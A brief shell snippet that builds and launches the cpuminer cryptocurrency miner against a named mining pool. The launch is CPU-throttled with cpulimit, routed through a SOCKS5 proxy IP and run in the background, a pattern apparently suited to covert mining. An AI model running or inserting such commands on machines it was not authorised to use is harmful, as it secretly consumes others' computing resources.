...
./build.sh
make
cpulimit --exe cpuminer --limit 44 -b && ./cpuminer -a lyra2z330 -o stratum+tcp://hxx-pool1.chainsilo.com:3032 -u manlytq.180319 -p x -x socks5://45.32.192.60:1191 --background
